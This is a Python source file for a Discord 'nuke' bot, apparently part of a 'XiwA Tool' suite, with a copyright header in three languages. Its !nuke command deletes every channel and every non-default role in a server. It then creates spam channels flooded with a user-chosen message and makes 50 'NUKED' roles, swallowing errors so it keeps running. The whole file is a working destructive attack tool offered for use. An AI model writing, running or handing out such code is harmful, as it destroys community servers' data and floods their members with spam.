"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

import discord
from discord.ext import commands
import asyncio
import random

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot connecté en tant que {bot.user}')

@bot.command()
async def nuke(ctx):
    try:
        guild = ctx.guild
        await ctx.send("💣 Message à spammer:")
        msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=30.0)
        spam_message = msg.content
        await ctx.send("🔢 Nombre de messages par salon:")
        msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=30.0)
        msg_count = int(msg.content)
        await ctx.send("📍 Nombre de salons:")
        msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author, timeout=30.0)
        channel_count = int(msg.content)
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                continue
        for role in guild.roles:
            try:
                if role != guild.default_role:
                    await role.delete()
            except:
                continue
        for i in range(channel_count):
            try:
                channel = await guild.create_text_channel(f'nuked-{i}')
                for _ in range(msg_count):
                    try:
                        await channel.send(spam_message)
                        await asyncio.sleep(0.5)
                    except:
                        continue
            except:
                continue
        for i in range(50):
            try:
                await guild.create_role(name=f"NUKED-{i}", color=discord.Color.random())
            except:
                continue
    except Exception as e:
        print(f"Erreur: {str(e)}")

if __name__ == "__main__":
    token = input("Token du bot: ")
    bot.run(token)